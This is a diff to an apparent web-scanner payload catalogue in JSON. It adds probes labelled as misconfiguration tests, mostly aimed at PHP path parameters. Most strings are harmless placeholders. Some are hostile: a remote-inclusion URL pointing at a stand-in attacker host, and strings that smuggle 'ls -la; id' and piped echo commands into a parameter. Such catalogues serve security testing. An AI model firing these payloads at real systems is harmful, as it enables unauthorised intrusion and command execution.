@@ -31,5 +31,104 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-56652",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": ".NET",
+    "injection_point": "path_parameter",
+    "payload_string": "/.darkbicho",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56674",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "CGI",
+    "injection_point": "path_parameter",
+    "payload_string": "!@#$%",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-58463",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "[injection",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-58464",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "http://[ATTACKER]/echo.txt?",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-58465",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "' ls -la ; id '",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-58466",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "[char]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-58467",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "| echo|staff || y3dips(at)echo(dot)or(dot)id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62514",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "[Any_Text]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62517",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "[any_words]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
   }
 ]
